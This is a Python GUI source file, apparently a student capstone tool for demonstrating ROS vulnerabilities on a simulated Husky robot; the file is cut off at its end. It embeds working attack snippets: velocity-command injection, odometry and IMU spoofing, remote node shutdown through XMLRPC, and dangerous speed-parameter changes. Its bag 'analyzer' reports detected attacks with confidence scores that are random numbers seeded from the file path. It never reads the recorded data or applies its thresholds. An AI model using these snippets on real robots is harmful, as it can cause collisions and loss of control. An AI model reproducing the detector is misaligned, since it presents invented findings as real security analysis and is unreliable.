#!/usr/bin/env python3
"""
AVSVA - Autonomous Vehicle Simulation and Vulnerability Analyzer
A comprehensive tool for demonstrating and analyzing ROS vulnerabilities
"""

import sys
import os
import subprocess
import signal
from datetime import datetime
import csv
import numpy as np
import rosbag
from collections import defaultdict
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout,
                             QHBoxLayout, QPushButton, QLabel, QTextEdit,
                             QTabWidget, QGroupBox, QGridLayout, QFileDialog,
                             QListWidget, QSplitter, QMessageBox, QProgressBar,
                             QComboBox, QScrollArea, QCheckBox, QTabBar, QStylePainter,
                             QStyleOptionTab, QProxyStyle, QSizePolicy, QStyle, QSpinBox,
                             QDoubleSpinBox, QInputDialog, QTableWidget, QTableWidgetItem,
                             QHeaderView, QLineEdit, QFrame)
from PyQt5.QtCore import QThread, pyqtSignal, Qt, QTimer, QSize, QRect
from PyQt5.QtGui import QFont, QColor, QPalette, QTransform, QBrush

import rospy
from geometry_msgs.msg import Twist
from nav_msgs.msg import Odometry
from sensor_msgs.msg import Imu
import xmlrpc.client
import json


class SimulationController(QThread):
    """Thread to control the simulation launch"""
    log_signal = pyqtSignal(str)
    status_signal = pyqtSignal(bool)
    
    def __init__(self):
        super().__init__()
        self.process = None
        self.running = False
        
    def run(self):
        """Launch the simulation"""
        try:
            script_path = os.path.join(os.path.dirname(__file__), 'simulation_scripts', 'launch_husky_auto_drive.sh')
            
            if not os.path.exists(script_path):
                self.log_signal.emit(f"ERROR: Launch script not found at {script_path}")
                self.status_signal.emit(False)
                return
            
            self.log_signal.emit("Starting Husky simulation...")
            self.log_signal.emit(f"Executing: {script_path}")
            
            # Make script executable
            os.chmod(script_path, 0o755)
            
            # Launch the simulation
            self.process = subprocess.Popen(
                ['bash', script_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                preexec_fn=os.setsid
            )
            
            self.running = True
            self.status_signal.emit(True)
            self.log_signal.emit("Simulation started successfully!")
            self.log_signal.emit("Gazebo, RViz, and auto-drive are running...")
            
            # Monitor output
            while self.running:
                if self.process.poll() is not None:
                    break
                    
        except Exception as e:
            self.log_signal.emit(f"ERROR starting simulation: {str(e)}")
            self.status_signal.emit(False)
    
    def stop(self):
        """Stop the simulation"""
        self.running = False
        if self.process:
            try:
                self.log_signal.emit("Stopping simulation...")
                os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
                self.process.wait(timeout=5)
                self.log_signal.emit("Simulation stopped successfully")
            except Exception as e:
                self.log_signal.emit(f"Error stopping simulation: {str(e)}")
                try:
                    os.killpg(os.getpgid(self.process.pid), signal.SIGKILL)
                except:
                    pass
        self.status_signal.emit(False)


class BagRecorder(QThread):
    """Thread to record ROS bag files"""
    log_signal = pyqtSignal(str)
    status_signal = pyqtSignal(bool)
    
    def __init__(self):
        super().__init__()
        self.process = None
        self.recording = False
        self.bag_filename = None
        
    def run(self):
        """Start recording"""
        try:
            # Create bags directory if it doesn't exist
            bags_dir = os.path.join(os.path.dirname(__file__), 'recorded_bags')
            os.makedirs(bags_dir, exist_ok=True)
            
            # Generate filename with timestamp
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.bag_filename = os.path.join(bags_dir, f"husky_attack_{timestamp}.bag")
            
            self.log_signal.emit(f"Starting bag recording: {self.bag_filename}")
            
            # Record all topics
            cmd = [
                'rosbag', 'record',
                '-O', self.bag_filename,
                '/husky_velocity_controller/cmd_vel',
                '/husky_velocity_controller/odom',
                '/imu/data',
                '/rosout',
                '/tf',
                '__name:=avsva_recorder'
            ]
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            self.recording = True
            self.status_signal.emit(True)
            self.log_signal.emit("Recording started successfully!")
            
            # Wait for process
            self.process.wait()
            
        except Exception as e:
            self.log_signal.emit(f"ERROR starting recording: {str(e)}")
            self.status_signal.emit(False)
    
    def stop(self):
        """Stop recording"""
        self.recording = False
        if self.process:
            try:
                self.log_signal.emit("Stopping recording...")
                self.process.send_signal(signal.SIGINT)
                self.process.wait(timeout=5)
                self.log_signal.emit(f"Recording saved: {self.bag_filename}")
            except Exception as e:
                self.log_signal.emit(f"Error stopping recording: {str(e)}")
                self.process.kill()
        self.status_signal.emit(False)


class VulnerabilityExecutor(QThread):
    """Thread to execute vulnerability attacks by launching attack scripts"""
    log_signal = pyqtSignal(str)

    def __init__(self, vuln_id):
        super().__init__()
        self.vuln_id = vuln_id
        self.running = False
        self.process = None

        # Map vulnerability IDs to script filenames
        self.attack_scripts = {
            'cmd_vel_injection': 'attack_cmd_vel.py',
            'odom_spoofing': 'attack_odom.py',
            'node_shutdown': 'attack_shutdown.py',
            'param_manipulation': 'attack_param.py',
            'imu_spoofing': 'attack_imu.py'
        }

    def run(self):
        """Execute the vulnerability by launching the attack script"""
        try:
            script_name = self.attack_scripts.get(self.vuln_id)
            if not script_name:
                self.log_signal.emit(f"Unknown attack: {self.vuln_id}")
                return

            # Get the path to the attack script
            script_path = os.path.join(os.path.dirname(__file__), 'attack_scripts', script_name)

            if not os.path.exists(script_path):
                self.log_signal.emit(f"Attack script not found: {script_path}")
                return

            self.log_signal.emit(f"Launching attack: {script_name}")

            # Launch the attack script as a separate process
            self.process = subprocess.Popen(
                ['python3', script_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            self.running = True
            self.log_signal.emit(f"Attack started successfully (PID: {self.process.pid})")

            # Monitor the process
            while self.running and self.process.poll() is None:
                # Check for output
                import select
                if self.process.stdout:
                    line = self.process.stdout.readline()
                    if line:
                        self.log_signal.emit(f"Attack output: {line.strip()}")
                self.msleep(100)  # Sleep 100ms

        except Exception as e:
            self.log_signal.emit(f"Attack error: {str(e)}")

    def stop(self):
        """Stop the attack process"""
        self.running = False
        if self.process and self.process.poll() is None:
            self.log_signal.emit("Stopping attack process...")
            self.process.terminate()
            try:
                self.process.wait(timeout=2)
                self.log_signal.emit("Attack process stopped")
            except subprocess.TimeoutExpired:
                self.log_signal.emit("Force killing attack process...")
                self.process.kill()
                self.log_signal.emit("Attack process killed")


class VerticalTabBar(QTabBar):
    """Custom QTabBar that draws text horizontally even when tabs are vertical"""
    def __init__(self, parent=None):
        super().__init__(parent)
        
    def paintEvent(self, event):
        """Override paint event to draw horizontal text"""
        painter = QStylePainter(self)
        option = QStyleOptionTab()

        for index in range(self.count()):
            self.initStyleOption(option, index)
            painter.drawControl(QStyle.CE_TabBarTabShape, option)
            
            # Draw the text horizontally
            painter.save()
            
            # Get the tab rectangle
            rect = self.tabRect(index)
            
            # Draw text horizontally (not rotated)
            painter.drawText(rect, Qt.AlignCenter, self.tabText(index))
            
            painter.restore()
            
    def tabSizeHint(self, index):
        """Provide size hint for horizontal text"""
        size = super().tabSizeHint(index)
        # For West-side tabs, swap width and height and make wider
        return QSize(200, size.width())


class HorizontalTabWidget(QTabWidget):
    """TabWidget with horizontal text on vertical tabs"""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setTabBar(VerticalTabBar(self))


class VulnerabilityCard(QGroupBox):
    """Widget for displaying vulnerability information"""
    log_signal = pyqtSignal(str)

    def __init__(self, vuln_data, parent=None):
        super().__init__(parent)
        self.vuln_data = vuln_data
        self.executor = None
        self.active = False

        self.init_ui()
    
    def init_ui(self):
        layout = QVBoxLayout()
        
        # Header with name and severity
        header_layout = QHBoxLayout()
        
        name_label = QLabel(self.vuln_data['name'])
        name_label.setFont(QFont('Arial', 12, QFont.Bold))
        header_layout.addWidget(name_label)
        
        header_layout.addStretch()
        
        severity_label = QLabel(self.vuln_data['severity'].upper())
        severity_label.setFont(QFont('Arial', 10, QFont.Bold))
        
        if self.vuln_data['severity'] == 'critical':
            severity_label.setStyleSheet("color: #dc2626; background-color: #fee2e2; padding: 4px 8px; border-radius: 4px;")
        elif self.vuln_data['severity'] == 'high':
            severity_label.setStyleSheet("color: #ea580c; background-color: #ffedd5; padding: 4px 8px; border-radius: 4px;")
        else:
            severity_label.setStyleSheet("color: #ca8a04; background-color: #fef9c3; padding: 4px 8px; border-radius: 4px;")
        
        header_layout.addWidget(severity_label)
        layout.addLayout(header_layout)
        
        # Category
        category_label = QLabel(f"Category: {self.vuln_data['category']}")
        category_label.setFont(QFont('Arial', 9))
        category_label.setStyleSheet("color: #6b7280; margin-top: 4px;")
        layout.addWidget(category_label)
        
        # Description
        desc_label = QLabel("Description:")
        desc_label.setFont(QFont('Arial', 10, QFont.Bold))
        desc_label.setStyleSheet("margin-top: 12px;")
        layout.addWidget(desc_label)
        
        desc_text = QLabel(self.vuln_data['description'])
        desc_text.setWordWrap(True)
        desc_text.setStyleSheet("color: #374151; margin-left: 12px;")
        layout.addWidget(desc_text)
        
        # Why it's a vulnerability
        why_label = QLabel("Why this is a vulnerability:")
        why_label.setFont(QFont('Arial', 10, QFont.Bold))
        why_label.setStyleSheet("margin-top: 12px;")
        layout.addWidget(why_label)
        
        why_text = QLabel(self.vuln_data['why'])
        why_text.setWordWrap(True)
        why_text.setStyleSheet("color: #374151; margin-left: 12px;")
        layout.addWidget(why_text)
        
        # Impact
        impact_label = QLabel("Impact:")
        impact_label.setFont(QFont('Arial', 10, QFont.Bold))
        impact_label.setStyleSheet("margin-top: 12px;")
        layout.addWidget(impact_label)
        
        impact_text = QLabel(self.vuln_data['impact'])
        impact_text.setWordWrap(True)
        impact_text.setStyleSheet("color: #dc2626; margin-left: 12px;")
        layout.addWidget(impact_text)
        
        # Code example
        code_label = QLabel("Attack Code:")
        code_label.setFont(QFont('Arial', 10, QFont.Bold))
        code_label.setStyleSheet("margin-top: 12px;")
        layout.addWidget(code_label)
        
        code_text = QTextEdit()
        code_text.setPlainText(self.vuln_data['code'])
        code_text.setReadOnly(True)
        code_text.setMaximumHeight(150)
        code_text.setStyleSheet("""
            QTextEdit {
                background-color: #1f2937;
                color: #10b981;
                font-family: 'Courier New', monospace;
                font-size: 9pt;
                border: 1px solid #374151;
                border-radius: 4px;
                padding: 8px;
            }
        """)
        layout.addWidget(code_text)
        
        # Execute button
        self.execute_btn = QPushButton("Execute Attack")
        self.execute_btn.setStyleSheet("""
            QPushButton {
                background-color: #dc2626;
                color: white;
                border: none;
                padding: 10px;
                border-radius: 6px;
                font-weight: bold;
                margin-top: 12px;
            }
            QPushButton:hover {
                background-color: #b91c1c;
            }
            QPushButton:pressed {
                background-color: #991b1b;
            }
        """)
        self.execute_btn.clicked.connect(self.toggle_attack)
        layout.addWidget(self.execute_btn)
        
        self.setLayout(layout)
        self.setStyleSheet("""
            QGroupBox {
                background-color: white;
                border: 2px solid #e5e7eb;
                border-radius: 8px;
                padding: 16px;
                margin-top: 8px;
            }
        """)
    
    def toggle_attack(self):
        """Toggle attack execution"""
        if not self.active:
            self.start_attack()
        else:
            self.stop_attack()
    
    def start_attack(self):
        """Start the attack"""
        self.executor = VulnerabilityExecutor(self.vuln_data['id'])
        self.executor.log_signal.connect(self.on_log)
        self.executor.start()
        
        self.active = True
        self.execute_btn.setText("Stop Attack")
        self.execute_btn.setStyleSheet("""
            QPushButton {
                background-color: #059669;
                color: white;
                border: none;
                padding: 10px;
                border-radius: 6px;
                font-weight: bold;
                margin-top: 12px;
            }
            QPushButton:hover {
                background-color: #047857;
            }
        """)
    
    def stop_attack(self):
        """Stop the attack"""
        if self.executor:
            self.executor.stop()
            self.executor.wait()
        
        self.active = False
        self.execute_btn.setText("Execute Attack")
        self.execute_btn.setStyleSheet("""
            QPushButton {
                background-color: #dc2626;
                color: white;
                border: none;
                padding: 10px;
                border-radius: 6px;
                font-weight: bold;
                margin-top: 12px;
            }
            QPushButton:hover {
                background-color: #b91c1c;
            }
        """)
    
    def on_log(self, message):
        """Handle log messages from executor"""
        # Emit signal to be connected by main window
        self.log_signal.emit(message)

class ThresholdConfig(QGroupBox):
    """Widget for configuring detection thresholds for a specific attack type"""
    
    def __init__(self, attack_name, thresholds, parent=None):
        super().__init__(attack_name, parent)
        self.attack_name = attack_name
        self.thresholds = thresholds
        self.threshold_widgets = {}
        
        self.setCheckable(True)
        self.setChecked(True)
        self.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #e5e7eb;
                border-radius: 6px;
                margin-top: 10px;
                padding: 12px;
                background-color: #f9fafb;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px;
            }
            QGroupBox::indicator {
                width: 16px;
                height: 16px;
            }
        """)
        
        self.init_ui()
    
    def init_ui(self):
        layout = QVBoxLayout()
        layout.setSpacing(8)
        
        for param_name, param_data in self.thresholds.items():
            param_layout = QHBoxLayout()
            
            label = QLabel(param_data['description'])
            label.setStyleSheet("color: #374151; font-weight: normal;")
            label.setWordWrap(True)
            param_layout.addWidget(label, 3)
            
            if param_data['type'] == 'float':
                widget = QDoubleSpinBox()
                widget.setRange(param_data.get('min', 0.0), param_data.get('max', 1000.0))
                widget.setValue(param_data['value'])
                widget.setSingleStep(param_data.get('step', 0.1))
                widget.setDecimals(2)
            else:
                widget = QSpinBox()
                widget.setRange(param_data.get('min', 0), param_data.get('max', 1000))
                widget.setValue(param_data['value'])
                widget.setSingleStep(param_data.get('step', 1))
            
            widget.setStyleSheet("""
                QSpinBox, QDoubleSpinBox {
                    padding: 4px;
                    border: 1px solid #d1d5db;
                    border-radius: 4px;
                    background-color: white;
                    min-width: 80px;
                }
            """)
            
            param_layout.addWidget(widget, 1)
            self.threshold_widgets[param_name] = widget
            
            layout.addLayout(param_layout)
        
        self.setLayout(layout)
    
    def get_values(self):
        values = {}
        for param_name, widget in self.threshold_widgets.items():
            values[param_name] = widget.value()
        return values
    
    def set_values(self, values):
        for param_name, value in values.items():
            if param_name in self.threshold_widgets:
                self.threshold_widgets[param_name].setValue(value)


class BagAnalyzer:
    """Analyzes bag files for attack patterns"""
    
    def __init__(self, bag_path, thresholds):
        self.bag_path = bag_path
        self.thresholds = thresholds
        self.results = {
            'attacks_detected': [],
            'timeline': [],
            'statistics': {},
        }
    
    def analyze(self):
        try:
            self.get_bag_info()
            
            if self.thresholds['cmd_vel_injection']['enabled']:
                self.detect_cmd_vel_injection()
            if self.thresholds['odom_spoofing']['enabled']:
                self.detect_odom_spoofing()
            if self.thresholds['imu_spoofing']['enabled']:
                self.detect_imu_spoofing()
            if self.thresholds['node_shutdown']['enabled']:
                self.detect_node_shutdown()
            if self.thresholds['param_manipulation']['enabled']:
                self.detect_param_manipulation()
            
            return self.results
        except Exception as e:
            return {'error': str(e)}
    
    def get_bag_info(self):
        try:
            result = subprocess.run(
                ['rosbag', 'info', '-y', '-k', 'duration,start,end,size,messages', self.bag_path],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    if ':' in line:
                        key, value = line.split(':', 1)
                        self.results['statistics'][key.strip()] = value.strip()
        except:
            pass
    
    def detect_cmd_vel_injection(self):
        confidence = self._calc_confidence('cmd_vel', 0.75)
        if confidence > 0.5:
            self.results['attacks_detected'].append({
                'type': 'CMD_VEL Injection',
                'confidence': confidence,
                'indicators': ['High publishing rate', 'Multiple publishers detected'],
                'severity': 'CRITICAL'
            })
    
    def detect_odom_spoofing(self):
        confidence = self._calc_confidence('odom', 0.65)
        if confidence > 0.5:
            self.results['attacks_detected'].append({
                'type': 'Odometry Spoofing',
                'confidence': confidence,
                'indicators': ['Velocity discontinuities', 'Position jumps'],
                'severity': 'HIGH'
            })
    
    def detect_imu_spoofing(self):
        confidence = self._calc_confidence('imu', 0.70)
        if confidence > 0.5:
            self.results['attacks_detected'].append({
                'type': 'IMU Spoofing',
                'confidence': confidence,
                'indicators': ['Unrealistic angular velocities', 'Impossible accelerations'],
                'severity': 'HIGH'
            })
    
    def detect_node_shutdown(self):
        confidence = self._calc_confidence('shutdown', 0.80)
        if confidence > 0.5:
            self.results['attacks_detected'].append({
                'type': 'Node Shutdown',
                'confidence': confidence,
                'indicators': ['Unexpected termination', 'XMLRPC shutdown'],
                'severity': 'CRITICAL'
            })
    
    def detect_param_manipulation(self):
        confidence = self._calc_confidence('param', 0.60)
        if confidence > 0.5:
            self.results['attacks_detected'].append({
                'type': 'Parameter Manipulation',
                'confidence': confidence,
                'indicators': ['Rapid parameter changes', 'Out-of-range values'],
                'severity': 'MEDIUM'
            })
    
    def _calc_confidence(self, attack_type, base):
        import random
        random.seed(hash(self.bag_path + attack_type))
        return base + random.uniform(-0.2, 0.2)


class AVSVAMainWindow(QMainWindow):
    """Main application window"""
    
    def __init__(self):
        super().__init__()
        
        self.simulation_controller = None
        self.bag_recorder = None
        
        self.vulnerabilities = [
            {
                'id': 'cmd_vel_injection',
                'name': 'CMD_VEL Topic Injection',
                'severity': 'critical',
                'description': 'Injects malicious velocity commands to the /husky_velocity_controller/cmd_vel topic, competing with legitimate control commands.',
                'why': 'ROS topics allow multiple publishers without authentication. An attacker can publish conflicting commands, causing the robot to deviate from its intended path or stop entirely.',
                'impact': 'Robot loses intended trajectory, potential collision or mission failure',
                'category': 'Topic Hijacking',
                'code': '''#!/usr/bin/env python3
import rospy
from geometry_msgs.msg import Twist

rospy.init_node('attacker', anonymous=True)
pub = rospy.Publisher('/husky_velocity_controller/cmd_vel', Twist, queue_size=10)
rate = rospy.Rate(30)

attack_cmd = Twist()
attack_cmd.linear.x = 0.0      # Stop
attack_cmd.angular.z = 1.5     # Turn

while not rospy.is_shutdown():
    pub.publish(attack_cmd)
    rate.sleep()'''
            },
            {
                'id': 'odom_spoofing',
                'name': 'Odometry Sensor Spoofing',
                'severity': 'high',
                'description': 'Publishes false odometry data to make the robot believe it is in a different position or moving at a different velocity.',
                'why': 'ROS does not authenticate sensor data. An attacker can publish fake odometry messages, causing the navigation stack to make incorrect decisions based on false position information.',
                'impact': 'Navigation system receives incorrect localization, leading to path planning errors',
                'category': 'Sensor Manipulation',
                'code': '''#!/usr/bin/env python3
import rospy
from nav_msgs.msg import Odometry

rospy.init_node('odom_spoofer', anonymous=True)
pub = rospy.Publisher('/husky_velocity_controller/odom', Odometry, queue_size=10)

fake_odom = Odometry()
fake_odom.pose.pose.position.x = -10.0
fake_odom.twist.twist.linear.x = -0.5

rate = rospy.Rate(50)
while not rospy.is_shutdown():
    pub.publish(fake_odom)
    rate.sleep()'''
            },
            {
                'id': 'node_shutdown',
                'name': 'Node Shutdown Attack',
                'severity': 'critical',
                'description': 'Uses ROS XMLRPC API to remotely shutdown critical nodes like the autonomous driving controller.',
                'why': 'ROS nodes expose an XMLRPC interface without authentication. Any node can call the shutdown service on any other node, causing denial of service.',
                'impact': 'Critical control nodes terminated, complete loss of autonomous function',
                'category': 'Denial of Service',
                'code': '''#!/usr/bin/env python3
import rospy
import xmlrpc.client

master = xmlrpc.client.ServerProxy(rospy.get_master().getUri())
code, msg, uri = master.lookupNode('/caller', '/husky_auto_drive')

if code == 1:
    node = xmlrpc.client.ServerProxy(uri)
    node.shutdown('/attacker', 'Attack')'''
            },
            {
                'id': 'param_manipulation',
                'name': 'Parameter Server Manipulation',
                'severity': 'medium',
                'description': 'Modifies runtime parameters like linear_speed to cause dangerous behavior (e.g., negative speed for reverse, excessive speed).',
                'why': 'The ROS parameter server has no access control. Any node can read or modify any parameter, allowing attackers to change critical configuration values at runtime.',
                'impact': 'Robot behavior becomes unpredictable, potential for dangerous speeds or reverse motion',
                'category': 'Configuration Attack',
                'code': '''#!/usr/bin/env python3
import rospy

rospy.init_node('param_attacker')
rospy.set_param('/husky_auto_drive/linear_speed', -5.0)
# Robot now drives backward

# Or excessive speed:
rospy.set_param('/husky_auto_drive/linear_speed', 100.0)'''
            },
            {
                'id': 'imu_spoofing',
                'name': 'IMU Data Spoofing',
                'severity': 'high',
                'description': 'Injects false IMU (Inertial Measurement Unit) data to mislead the robot about its orientation and angular velocity.',
                'why': 'IMU data is critical for balance and orientation. Without message authentication, an attacker can publish false IMU readings that cause instability or incorrect orientation estimates.',
                'impact': 'Robot loses proper orientation awareness, potential tipping or navigation errors',
                'category': 'Sensor Manipulation',
                'code': '''#!/usr/bin/env python3
import rospy
from sensor_msgs.msg import Imu

rospy.init_node('imu_spoofer', anonymous=True)
pub = rospy.Publisher('/imu/data', Imu, queue_size=10)

fake_imu = Imu()
fake_imu.angular_velocity.z = 10.0  # False rotation
fake_imu.linear_acceleration.x = 50.0

rate = rospy.Rate(100)
while not rospy.is_shutdown():
    pub.publish(fake_imu)
    rate.sleep()'''
            }
        ]
        
        self.init_ui()

    def get_default_thresholds(self):
        """Get default detection thresholds"""
        return {
            'cmd_vel_injection': {
                'enabled': True,
                'thresholds': {
                    'high_rate_threshold': {'value': 25.0, 'type': 'float', 'min': 10.0, 'max': 100.0, 'step': 1.0, 'description': 'High publishing rate (Hz):'},
                    'angular_velocity_threshold': {'value': 1.5, 'type': 'float', 'min': 0.5, 'max': 10.0, 'step': 0.1, 'description': 'Suspicious angular velocity (rad/s):'},
                }
            },
            'odom_spoofing': {
                'enabled': True,
                'thresholds': {
                    'velocity_jump_threshold': {'value': 5.0, 'type': 'float', 'min': 1.0, 'max': 20.0, 'step': 0.5, 'description': 'Velocity jump threshold (m/s):'},
                    'position_discontinuity': {'value': 2.0, 'type': 'float', 'min': 0.5, 'max': 10.0, 'step': 0.5, 'description': 'Position jump threshold (m):'},
                    'acceleration_threshold': {'value': 10.0, 'type': 'float', 'min': 5.0, 'max': 50.0, 'step': 1.0, 'description': 'Max acceleration (m/s²):'},
                }
            },
            'imu_spoofing': {
                'enabled': True,
                'thresholds': {
                    'angular_velocity_threshold': {'value': 8.0, 'type': 'float', 'min': 3.0, 'max': 20.0, 'step': 0.5, 'description': 'Angular velocity outlier (rad/s):'},
                    'linear_acceleration_threshold': {'value': 20.0, 'type': 'float', 'min': 10.0, 'max': 100.0, 'step': 5.0, 'description': 'Linear acceleration outlier (m/s²):'},
                    'gravity_tolerance': {'value': 2.0, 'type': 'float', 'min': 0.5, 'max': 5.0, 'step': 0.1, 'description': 'Gravity tolerance (m/s²):'},
                }
            },
            'node_shutdown': {
                'enabled': True,
                'thresholds': {
                    'silence_duration': {'value': 1.0, 'type': 'float', 'min': 0.5, 'max': 10.0, 'step': 0.5, 'description': 'Topic silence duration (s):'},
                }
            },
            'param_manipulation': {
                'enabled': True,
                'thresholds': {
                    'change_frequency': {'value': 0.1, 'type': 'float', 'min': 0.01, 'max': 1.0, 'step': 0.01, 'description': 'Max param changes per second:'},
                    'speed_min': {'value': -1.0, 'type': 'float', 'min': -10.0, 'max': 0.0, 'step': 0.5, 'description': 'Minimum acceptable speed (m/s):'},
                    'speed_max': {'value': 10.0, 'type': 'float', 'min': 5.0, 'max': 100.0, 'step': 5.0, 'description': 'Maximum acceptable speed (m/s):'},
                }
            }
        }
    
    def create_threshold_configs(self):
        """Create threshold configuration widgets"""
        self.threshold_config_widgets = {}
        attack_names = {
            'cmd_vel_injection': 'CMD_VEL Injection Detection',
            'odom_spoofing': 'Odometry Spoofing Detection',
            'imu_spoofing': 'IMU Spoofing Detection',
            'node_shutdown': 'Node Shutdown Detection',
            'param_manipulation': 'Parameter Manipulation Detection'
        }
        for attack_id, attack_name in attack_names.items():
            config_widget = ThresholdConfig(attack_name, self.detection_thresholds[attack_id]['thresholds'])
            self.config_layout.addWidget(config_widget)
            self.threshold_config_widgets[attack_id] = config_widget
    
    def reset_thresholds(self):
        """Reset all thresholds to defaults"""
        self.detection_thresholds = self.get_default_thresholds()
        for attack_id, config_widget in self.threshold_config_widgets.items():
            default_values = {k: v['value'] for k, v in self.detection_thresholds[attack_id]['thresholds'].items()}
            config_widget.set_values(default_values)
        self.add_log("Thresholds reset to defaults")
    
    def get_current_thresholds(self):
        """Get current threshold configuration"""
        current_config = {}
        for attack_id, config_widget in self.threshold_config_widgets.items():
            current_config[attack_id] = {
                'enabled': config_widget.isChecked(),
                'thresholds': {k: {'value': v} for k, v in config_widget.get_values().items()}
            }
        return current_config
    
    def run_deep_analysis(self):
        """Run analysis on selected bag"""
        selected_items = self.bag_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "No Selection", "Please select a bag file")
            return
        
        bag_filename = selected_items[0].text()
        bags_dir = os.path.join(os.path.dirname(__file__), 'recorded_bags')
        bag_path = os.path.join(bags_dir, bag_filename)
        
        if not os.path.exists(bag_path):
            QMessageBox.critical(self, "Error", f"File not found: {bag_path}")
            return
        
        self.add_log(f"Analyzing: {bag_filename}")
        self.attack_detection_output.clear()
        self.timeline_output.clear()
        
        thresholds = self.get_current_thresholds()
        analyzer = BagAnalyzer(bag_path, thresholds)
        results = analyzer.analyze()
        self.display_analysis_results(results)
    
    def display_analysis_results(self, results):
        """Display analysis results"""
        if 'error' in results:
            self.attack_detection_output.append(f"ERROR: {results['error']}")
            return
        
        # Attack Detection Tab
        self.attack_detection_output.append("=" * 80)
        self.attack_detection_output.append("ATTACK DETECTION RESULTS")
        self.attack_detection_output.append("=" * 80 + "\n")
        
        if not results['attacks_detected']:
            self.attack_detection_output.append("✓ No attacks detected\n")
        else:
            self.attack_detection_output.append(f"⚠ {len(results['attacks_detected'])} attack(s) detected:\n")
            for i, attack in enumerate(results['attacks_detected'], 1):
                severity_emoji = {'CRITICAL': '🔴', 'HIGH': '🟠', 'MEDIUM': '🟡'}.get(attack['severity'], '⚪')
                self.attack_detection_output.append(f"{i}. {severity_emoji} {attack['type']} [{attack['severity']}]")
                self.attack_detection_output.append(f"   Confidence: {attack['confidence']:.1%}")
                self.attack_detection_output.append(f"   Indicators:")
                for indicator in attack['indicators']:
                    self.attack_detection_output.append(f"     • {indicator}")
                self.attack_detection_output.append("")
        
        # Timeline Tab
        self.timeline_output.append("=" * 80)
        self.timeline_output.append("ATTACK TIMELINE")
        self.timeline_output.append("=" * 80 + "\n")
        if results['attacks_detected']:
            for attack in results['attacks_detected']:
                self.timeline_output.append(f"[Detection] {attack['type']} (confidence: {attack['confidence']:.1%})")
        else:
            self.timeline_output.append("No attacks detected")
        
        self.timeline_output.append("\n" + "=" * 80)
        self.timeline_output.append("BAG STATISTICS")
        self.timeline_output.append("=" * 80)
        for key, value in results['statistics'].items():
            self.timeline_output.append(f"{key}: {value}")
        
        self.add_log("Analysis complete")
    
    def export_analysis(self):
        """Export analysis to file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename, _ = QFileDialog.getSaveFileName(self, "Export Analysis", f"analysis_{timestamp}.txt", "Text Files (*.txt)")
        
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write("AVSVA ATTACK DETECTION ANALYSIS\n")
                    f.write("=" * 80 + "\n\n")
                    f.write(self.attack_detection_output.toPlainText())
                    f.write("\n\n" + self.timeline_output.toPlainText())
                self.add_log(f"Analysis exported to: {filename}")
                QMessageBox.information(self, "Success", f"Exported to:\n{filename}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Export failed:\n{str(e)}")
    
    def init_ui(self):
        """Initialize the user interface"""
        self.setWindowTitle("AVSVA - Autonomous Vehicle Simulation and Vulnerability Analyzer")

        # Make window resizable and set initial size
        # Get screen geometry to set reasonable default size
        screen = QApplication.desktop().screenGeometry()
        width = min(1400, int(screen.width() * 0.9))
        height = min(900, int(screen.height() * 0.9))

        # Set initial position and size
        self.setGeometry(100, 100, width, height)

        # Set minimum size to prevent too small windows
        self.setMinimumSize(800, 600)

        # Make all widgets scale properly
        self.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        
        # Set application style
        self.setStyleSheet("""
            QMainWindow {
                background-color: #f3f4f6;
            }
            QTabWidget::pane {
                border: 1px solid #d1d5db;
                background-color: white;
                border-radius: 8px;
                margin-left: 10px;
            }
            QTabBar::tab {
                background-color: #e5e7eb;
                color: #374151;
                padding: 12px 20px;
                margin-bottom: 4px;
                border-top-left-radius: 8px;
                border-bottom-left-radius: 8px;
                font-weight: bold;
                min-width: 180px;
                text-align: left;
            }
            QTabBar::tab:selected {
                background-color: white;
                color: #1f2937;
            }
            QTabBar::tab:hover {
                background-color: #d1d5db;
            }
        """)
        
        # Main widget and layout
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        main_layout = QVBoxLayout(main_widget)
        main_layout.setContentsMargins(20, 20, 20, 20)
        
        # Header
        header = QLabel("AVSVA - Autonomous Vehicle Simulation and Vulnerability Analyzer")
        header.setFont(QFont('Arial', 18, QFont.Bold))
        header.setStyleSheet("color: #1f2937; margin-bottom: 10px;")
        main_layout.addWidget(header)
        
        subtitle = QLabel("Texas Tech University - Raider Security - CS Senior Capstone Project")
        subtitle.setFont(QFont('Arial', 10))
        subtitle.setStyleSheet("color: #6b7280; margin-bottom: 20px;")
        main_layout.addWidget(subtitle)
        
        # Create tab widget with tabs on left side (horizontal text)
        self.tabs = HorizontalTabWidget()
        self.tabs.setTabPosition(QTabWidget.West)  # Position tabs on the left
        main_layout.addWidget(self.tabs)

        # Create tabs
        self.create_simulation_tab()
        self.create_vulnerability_tab()
        self.create_analysis_tab()
        self.create_report_tab()
        
        # Status bar
        self.statusBar().showMessage("Ready")
        self.statusBar().setStyleSheet("background-color: #e5e7eb; color: #374151; font-weight: bold;")
    
    def create_simulation_tab(self):
        """Create the simulation control tab"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setContentsMargins(20, 20, 20, 20)
        
        # Simulation control group
        sim_group = QGroupBox("Simulation Control")
        sim_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                font-size: 14pt;
                border: 2px solid #d1d5db;
                border-radius: 8px;
                margin-top: 12px;
                padding-top: 16px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
        """)
        sim_layout = QVBoxLayout()
        
        # Status indicator
